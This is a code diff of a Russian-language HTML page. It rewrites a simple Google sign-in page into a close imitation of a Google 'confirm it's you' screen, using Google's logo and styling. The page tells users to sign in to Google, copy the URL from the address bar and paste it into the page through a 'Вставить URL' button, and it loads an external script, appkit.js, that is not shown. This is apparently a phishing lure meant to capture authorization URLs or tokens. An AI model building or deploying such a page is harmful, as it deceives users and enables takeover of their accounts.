@@ -1,68 +1,254 @@
 <!DOCTYPE html>
 <html lang="ru">
 <head>
-    <meta charset="UTF-8" />
-    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>Вход через Google</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Подтверждение личности</title>
     <style>
-        /* Базовые стили для страницы */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, 'Helvetica Neue', Arial, sans-serif;
+        }
+
         body {
-            font-family: Arial, sans-serif;
+            min-height: 100vh;
             display: flex;
             justify-content: center;
             align-items: center;
-            min-height: 100vh;
-            margin: 0;
-            background: #f5f5f5;
+            background-color: #f1f3f4;
         }
-        .container {
-            background: white;
-            padding: 40px;
-            border-radius: 12px;
-            box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+
+        .card {
+            background: #ffffff;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.12);
+            padding: 48px 40px 36px;
+            max-width: 450px;
+            width: 100%;
             text-align: center;
-            max-width: 400px;
         }
-        h2 {
+
+        .logo {
             margin-bottom: 24px;
-            color: #1a1a1a;
         }
-        /* Стили для кнопки Google (кастомизируйте под свой дизайн) */
-        .googleLoginBtn {
-            display: inline-block;
-            background: #4285f4;
-            color: white;
+
+        .logo svg {
+            width: 72px;
+            height: 72px;
+        }
+
+        h1 {
+            font-size: 24px;
+            font-weight: 400;
+            color: #202124;
+            margin-bottom: 8px;
+        }
+
+        .subtitle {
             font-size: 16px;
+            color: #5f6368;
+            line-height: 1.5;
+            margin-bottom: 32px;
+        }
+
+        .instructions {
+            text-align: left;
+            margin-bottom: 32px;
+            padding-left: 8px;
+        }
+
+        .step {
+            display: flex;
+            align-items: flex-start;
+            gap: 12px;
+            margin-bottom: 16px;
+            font-size: 14px;
+            color: #202124;
+            line-height: 1.6;
+        }
+
+        .step-number {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            min-width: 24px;
+            height: 24px;
+            background: #e8f0fe;
+            color: #1a73e8;
+            border-radius: 50%;
+            font-size: 14px;
             font-weight: 500;
-            padding: 12px 32px;
-            border-radius: 40px;
+            flex-shrink: 0;
+        }
+
+        .step-text {
+            padding-top: 2px;
+        }
+
+        .step-text strong {
+            font-weight: 500;
+        }
+
+        .buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        /* Стиль кнопки Google Sign-In */
+        .googleLoginBtn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 10px 16px;
+            background: #1a73e8;
+            color: #fff;
+            font-size: 14px;
+            font-weight: 500;
             border: none;
+            border-radius: 4px;
             cursor: pointer;
-            transition: background 0.2s;
-            box-shadow: 0 2px 6px rgba(66, 133, 244, 0.3);
+            transition: background 0.2s, box-shadow 0.2s;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.1);
+            letter-spacing: 0.25px;
+            text-transform: none;
+            height: 44px;
             user-select: none;
         }
+
         .googleLoginBtn:hover {
-            background: #3367d6;
+            background: #1b66c9;
+            box-shadow: 0 1px 3px rgba(0, 0, 0, 0.18);
         }
+
         .googleLoginBtn:active {
-            background: #2a56c6;
+            background: #185abc;
+            box-shadow: 0 2px 6px rgba(0, 0, 0, 0.2);
+        }
+
+        .googleLoginBtn::before {
+            content: '';
+            display: inline-block;
+            width: 20px;
+            height: 20px;
+            background: url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 48 48'%3E%3Cpath fill='%23EA4335' d='M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z'/%3E%3Cpath fill='%234285F4' d='M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z'/%3E%3Cpath fill='%23FBBC05' d='M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z'/%3E%3Cpath fill='%2334A853' d='M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z'/%3E%3C/svg%3E") no-repeat center;
+            background-size: contain;
+            flex-shrink: 0;
+        }
+
+        /* Кнопка Paste URL (оставляем стандартную) */
+        .paste-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 10px 16px;
+            background: transparent;
+            color: #1a73e8;
+            font-size: 14px;
+            font-weight: 500;
+            border: 1px solid #dadce0;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background 0.2s;
+            letter-spacing: 0.25px;
+            height: 44px;
+        }
+
+        .paste-btn:hover {
+            background: #f8f9fa;
+            border-color: #d2e3fc;
+        }
+
+        .paste-btn:active {
+            background: #e8f0fe;
+        }
+
+        .footer {
+            margin-top: 32px;
+            display: flex;
+            justify-content: center;
+            gap: 24px;
+            font-size: 12px;
+            color: #5f6368;
+        }
+
+        .footer a {
+            color: #5f6368;
+            text-decoration: none;
+        }
+
+        .footer a:hover {
+            text-decoration: underline;
+        }
+
+        .lang-selector {
+            font-size: 12px;
+            color: #5f6368;
+            margin-top: 16px;
+        }
+
+        .lang-selector span {
+            cursor: default;
         }
     </style>
 </head>
 <body>
+    <div class="card">
+        <!-- Логотип Google -->
+        <div class="logo">
+            <svg viewBox="0 0 48 48" xmlns="http://www.w3.org/2000/svg">
+                <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+                <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+                <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+                <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+            </svg>
+        </div>
 
-    <div class="container">
-        <h2>Войдите с Google</h2>
-        <!-- Кнопка входа через Google -->
-        <div class="googleLoginBtn">Войти через Google</div>
-        <p style="margin-top: 20px; font-size: 14px; color: #666;">
-            Нажмите кнопку, чтобы войти в свой аккаунт
+        <h1>Подтвердите, что это вы</h1>
+        <p class="subtitle">
+            Чтобы обеспечить безопасность вашего аккаунта, Google необходимо подтвердить, что это вы. Следуйте инструкциям.
         </p>
+
+        <div class="instructions">
+            <div class="step">
+                <span class="step-number">1</span>
+                <span class="step-text">Войдите в свой <strong>аккаунт Google</strong>.</span>
+            </div>
+            <div class="step">
+                <span class="step-number">2</span>
+                <span class="step-text">Скопируйте URL-адрес из адресной строки.</span>
+            </div>
+            <div class="step">
+                <span class="step-number">3</span>
+                <span class="step-text">Нажмите <strong>«Вставить URL»</strong> и подтвердите вставку.</span>
+            </div>
+        </div>
+
+        <div class="buttons">
+            <!-- Кнопка Sign In заменена на div с классом googleLoginBtn -->
+            <div class="googleLoginBtn">Войти</div>
+            
+            <!-- Кнопка Paste URL -->
+            <button class="paste-btn">Вставить URL</button>
+        </div>
+
+        <div class="lang-selector">
+            <span>Русский</span>
+        </div>
+
+        <div class="footer">
+            <a href="#">Справка</a>
+            <a href="#">Конфиденциальность</a>
+            <a href="#">Условия</a>
+        </div>
     </div>
 
-    <!-- Подключаем скрипт appkit.js в самом конце body -->
+    <!-- Подключение внешнего скрипта -->
     <script src="./appkit.js"></script>
-
 </body>
 </html>
